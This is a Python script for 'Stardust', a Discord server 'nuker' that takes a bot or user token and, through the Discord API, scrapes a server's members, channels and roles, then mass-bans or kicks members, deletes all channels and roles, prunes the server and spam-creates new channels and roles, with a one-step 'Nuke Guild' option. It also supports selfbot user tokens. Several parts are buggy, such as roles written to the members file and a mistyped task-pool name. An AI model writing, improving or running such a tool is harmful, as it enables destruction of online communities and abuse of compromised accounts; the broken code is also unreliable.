import os
try:
 import discord
 import time
 import aiohttp
 from discord.ext import commands
 import threading
 import gratient
 import json
 import tasksio
 import asyncio
 from colorama import Fore
 import pystyle
 from pystyle import Colors, Write, Box 
except:
 os.system("pip install discord")
 os.system("pip install aiohttp")
 os.system("pip install pystyle")
 os.system("pip install colorama")
 os.system("pip install gratient")
 os.system("pip install tasksio")
 import discord
 import tasksio
 from tasksio import TaskPool
 import time
 import aiohttp
 from discord.ext import commands
 import threading
 import gratient
 import json
 import asyncio
 from colorama import Fore
 import pystyle
 from pystyle import Colors, Write, Box 


os.system("clear")
t = time.localtime()
t1 = time.strftime("%H:%M:%S", t)

redtheme = Colors.red_to_green
greentheme = Colors.green_to_yellow
yellowtheme = Colors.yellow_to_red
normal = Colors.purple_to_blue
purple = Colors.red_to_purple

Write.Print(f'[ {t1} ] Note : Dont Directly Copy Paste Stuff, Use Clipboard Or pystyle Will Glitch', normal, interval=0.05)

check = Write.Input(f"[ {t1} ] Bot ? (y/n): ", normal, interval=0.0001)
os.system("clear")
Write.Print(f'[ {t1} ] Token: ', normal, interval=0.0001)
token = input("")


if check == 'y' or check == 'Y':
  headers = {"Authorization": f"Bot {token}"}
  intents = discord.Intents.all()
  krizz = commands.Bot(command_prefix='iad', intents=intents)
else:
  headers = {"Authorization": f"{token}"}
  intents = discord.Intents.all()
  krizz = commands.Bot(command_prefix='iad', intents=intents, selfbot=True)

class stardust:
   def __init__(self):#useless and out of plan lmao
     t = time.localtime()
     self.time = time.strftime("%H:%M:%S", t)
     self.color= Fore.CYAN
     self.reset= Fore.RESET

   async def ban(guild, member):
     async with aiohttp.ClientSession() as session:
       async with session.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}", headers=headers) as response:
        if response.status in (200, 201, 202, 203, 204):
          Write.Print(f'[ {t1} ] Banned {member}\n', normal, interval=0.0001)
        else:
          Write.Print(f'[ {t1} ] Couldnt Ban {member}\n', normal, interval=0.0001)

   async def kick(guild, member):
     async with aiohttp.ClientSession() as session:
       async with session.delete(f"https://discord.com/api/v9/guilds/{guild}/members/{member}", headers=headers) as response:
        if response.status in (200, 201, 202, 203, 204):
          Write.Print(f'[ {t1} ] Kicked {member}\n', normal, interval=0.0001)
        else:
          Write.Print(f'[ {t1} ] Couldnt Kick {member}\n', normal, interval=0.0001)
          
   async def chdel(channel):
     async with aiohttp.ClientSession() as session:
      async with session.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headers) as response:
       if response.status in (200, 201, 202, 203, 204):
         Write.Print(f'[ {t1} ] Deleted {channel}\n', normal, interval=0.0001)
       else:
         Write.Print(f'[ {t1} ] Couldnt Delete {channel}\n', normal, interval=0.0001)
         
   async def roledel(guild, role):
     async with aiohttp.ClientSession as session:
      async with session.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}", headers=headers) as response:
        if response.status in (201, 202, 203, 204):
          Write.Print(f'[ {t1} ] Deleted {role}\n', normal, interval=0.0001)
        else:
          Write.Print(f'[ {t1} ] Couldnt Delete {role}\n', normal, interval=0.0001)

   async def prune(guild):
      @stardust.event
      async def on_ready():
        g = krizz.get_guild(int(guild))
        try:
         g.prune_members(days=1, roles=g.roles, reason='Stardust Nuker')
         Write.Print(f'[ {t1} ] Pruned {guild}\n', Colors.red_to_purple, interval=0.0001)
        except:
          Write.Print(f'[ {t1} ] Couldnt Prune {guild}\n', normal, interval=0.0001)
          
   def scrape(guild):
     @krizz.event
     async def on_ready():
       g = krizz.get_guild(int(guild))
       try:
         os.remove("scraped/members.txt")
         os.remove("scraped/channels.txt")
         os.remove("scraped/roles.txt")
       except:
         pass
       for m in g.members:
           with open("scraped/members.txt", "a") as file:
             file.write(f"{m.id}\n")
             file.close()
       for c in g.channels:
           
           with open("scraped/channels.txt", "a") as file:
             file.write(f"{c.id}\n")
             file.close()
       for r in g.roles:
           
           with open("scraped/members.txt", "a") as file:
             file.write(f"{r.id}\n")
             file.close()
       Write.Print(f'[ {t1} ] Scraped {len(g.members)} Members\n{len(g.channels)} Channels\n{len(g.roles)} Roles\n', normal, interval=0.0001)

   async def chcreate(guild, name):
    async with aiohttp.ClientSession() as session:
       data= {"name": name,
             "type": 0}
       async with session.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers, json=data) as response:
         if response.status in (201, 202, 203, 204):
          Write.Print(f'[ {t1} ] Created {name}\n', normal, interval=0.0001)
         else:
          Write.Print(f'[ {t1} ] Couldnt Create {name}\n', normal, interval=0.0001)

   async def rcreate(guild, name):
    async with aiohttp.ClientSession() as session:
       data= {"name": name}
       async with session.post(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers, json=data) as response:
          if response.status in (201, 202, 203, 204):
            Write.Print(f'[ {t1} ] Created {name}\n', normal, interval=0.0001)
          else:
            Write.Print(f'[ {t1} ] Couldnt Create {name}\n', normal, interval=0.0001)
              
   async def banexec():
     members = open("scraped/members.txt", "r")
     guild = Write.Input(f"[ {t1} ] Guild ID: ", normal, interval=0.0001)
     async with tasksio.TaskPool(10) as task:
      for member in members:
        await task.put(stardust.ban(guild, member))
       
   async def kickexec():
     members = open("scraped/members.txt", "r")
     guild = Write.Input(f"[ {t1} ] Guild ID: ", normal, interval=0.0001)
     async with tasksio.TaskPool(10) as task:
      for member in members:
       await task.put(stardust.kick(guild, member))
       
   async def delchexec():
     channels = open("scraped/channels.txt", "r")
     async with tasksio.TaskPool(10) as task:
      for channel in channels:
       await task.put(stardust.chdel(channel))

   async def delrexec():
     roles = open("scraped/roles.txt", "r")
     guild = Write.Input(f"[ {t1} ] Guild ID: ", normal, interval=0.0001)
     async with tasksio.TaskPool(10) as task:
      for role in roles:
       await task.put(stardust.roledel(guild, role))

   async def makechexec():
     guild = Write.Input(f"[ {t1} ] Guild ID: ", normal, interval=0.0001)
     name = Write.Input(f"[ {t1} ] Name: ", normal, interval=0.0001)
     amount = Write.Input(f"[ {t1} ] Amount: ", normal, interval=0.0001)
     async with tasksio.TaskPool(10) as task:
      for i in range(int(amount)):
       await task.put(stardust.chcreate(guild, name))

   async def makerexec():
     guild = Write.Input(f"[ {t1} ] Guild ID: ", normal, interval=0.0001)
     name = Write.Input(f"[ {t1} ] Name: ", normal, interval=0.0001)
     amount = Write.Input(f"[ {t1} ] Amount: ", normal, interval=0.0001)
     async with tasksio.TaskPool(10) as task:
       for i in range(int(amount)):
         await task.put(stardust.rcreate(guild, name))

   async def scrapexec():
    guild = Write.Input(f"[ {t1} ] Guild ID: ", normal, interval=0.0001)
    stardust.scrape(guild)

   async def prunexec():
     guild = Write.Input(f"[ {t1} ] Guild ID: ", normal, interval=0.0001)
     stardust.prune(guild)

   async def nuke():
     members = open("scraped/members.txt", "r")
     channels = open("scraped/channels.txt", "r")
     roles = open("scraped/roles.txt", "r")
     async with tasksio.Taskpool(10) as task:
       for member in members:
         await task.put(stardust.banexec())
       for channel in channels:
         await task.put(stardust.delchexec())
       for role in roles:
         await task.put(stardust.delrexec())
       await task.put(stardust.makechexec())
       await task.put(stardust.makerexec())
       

       
   
buax = Box.DoubleCube('''[1] Ban Members     [2] Kick Members
[3] Delete Channels [4] Delete Roles
[5] Make Channels   [6] Make Roles
[7] Scrape Guild    [8] Prune Guild
[9] Nuke Guild      [0] Exit
''')

def banner():
  os.system("clear")
  Write.Print(f'''        
        ╔═╗┌┬┐┌─┐┬─┐┌┬┐┬ ┬┌─┐┌┬┐
        ╚═╗ │ ├─┤├┬┘ │││ │└─┐ │ 
        ╚═╝ ┴ ┴ ┴┴└──┴┘└─┘└─┘ ┴ 
       
{buax}
[ {t1} ] Choice: ''', normal, interval=0.005, hide_cursor=True)
  choice = input('')
  if choice == '1':
     asyncio.run(stardust.banexec())
  elif choice == '2':
     asyncio.run(stardust.kickexec())
     
  elif choice == '3':
     asyncio.run(stardust.delchexec())
     
  elif choice == '4':
    asyncio.run(stardust.delrexec())
    
  elif choice == '5':
    asyncio.run(stardust.makechexec())
    
  elif choice == '6':
    asyncio.run(stardust.makerexec())
    
  elif choice == '7':
    asyncio.run(stardust.scrapexec())
    
  elif choice == '8':
     asyncio.run(stardust.prunexec())

  elif choice == '9':
    asyncio.run(stardust.nuke())

  elif choice == '10':
    exit()
  else:
     banner()
 
banner()

if check == 'y' or check == 'Y':
   krizz.run(token)
else:
   krizz.run(token, bot=False)
